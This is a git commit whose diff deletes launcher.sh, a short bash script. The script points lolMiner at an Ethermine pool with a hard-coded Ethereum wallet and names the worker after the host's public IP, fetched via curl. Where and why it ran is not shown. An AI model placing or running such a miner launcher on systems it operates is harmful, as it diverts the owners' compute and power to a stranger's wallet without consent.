a10d69d3135f97fd2af0601e99e4d55d17ffcd45
Ines1610 <79271803+Ines1610@users.noreply.github.com>
2021-02-19 00:34:31 +0700

    Delete launcher.sh

--- launcher.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=asia1.ethermine.org:14444
-WALLET=0x5916e8b1865E65d068f2529d9E5eC2BBe80ECb42
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lol
-
-cd "$(dirname "$0")"
-
-chmod +x ./lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 0 $@
